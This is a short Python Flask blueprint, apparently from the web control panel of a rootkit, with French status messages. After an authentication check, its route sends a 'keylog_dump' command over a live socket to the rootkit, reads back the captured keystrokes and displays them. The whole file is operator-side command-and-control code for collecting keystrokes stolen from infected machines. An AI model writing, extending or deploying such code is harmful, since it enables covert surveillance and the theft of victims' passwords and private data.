from flask import Blueprint, render_template, redirect, url_for
import utils.state as state

keylogger_bp = Blueprint('keylogger', __name__)

@keylogger_bp.route('/')
def keylogger():
    if not state.authenticated:
        return redirect(url_for('auth.login'))

    try:
        with state.connection_lock:
            if state.rootkit_connection:
                state.rootkit_connection.sendall(b"keylog_dump\n")
                state.rootkit_connection.settimeout(2)
                data = state.rootkit_connection.recv(state.BUFFER_SIZE).decode()
                state.rootkit_connection.settimeout(None)
                keylog_data = data.strip()
            else:
                keylog_data = "Aucune connexion au rootkit."
    except Exception as e:
        keylog_data = f"Erreur : {e}"

    return render_template("keylogger.html", keylog_data=keylog_data)
